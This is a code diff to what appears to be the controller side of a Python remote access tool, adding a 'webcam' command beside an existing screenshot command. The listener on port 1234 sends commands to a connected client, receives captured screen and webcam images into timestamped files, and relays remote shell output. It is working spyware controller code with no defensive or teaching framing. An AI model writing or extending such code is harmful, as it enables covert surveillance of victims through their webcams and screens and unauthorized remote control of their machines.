@@ -1,4 +1,4 @@
-#To add the feature of Screenshots
+#To add the feature of webcam
 import socket
 from datetime import date, datetime
 
@@ -54,6 +54,20 @@ def screenshot(c):
     print("[+] Transfer Complete")
     f.close()
 
+def webcam(c):
+    destination = "Images\\" + str(date.today()) + "_" +str(datetime.now().strftime("%H_%M_%S")) +".png"
+    f = open(destination, "wb")
+    while True:
+        bits = c.recv(1024)
+        # DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042 is the hash of the string "this is the end of file"
+        if b'DE96CEE525AF2AF436B5A7BD2E6565FB377FD98BCA30A82F39FAB9ECE9FE7042' in bits:
+            bits = bits[0:-64]
+            f.write(bits)
+            break
+        f.write(bits)
+    print("[+] Transfer Complete")
+    f.close()
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 1234
 s.bind(('', port))
@@ -82,6 +96,10 @@ while True:
     elif cmd == 'ss':
         c.send(cmd.encode())
         screenshot(c)
+        continue
+    elif cmd == 'webcam':
+        c.send(cmd.encode())
+        webcam(c)
         continue
     c.send(cmd.encode())
     shell = c.recv(1024).decode()
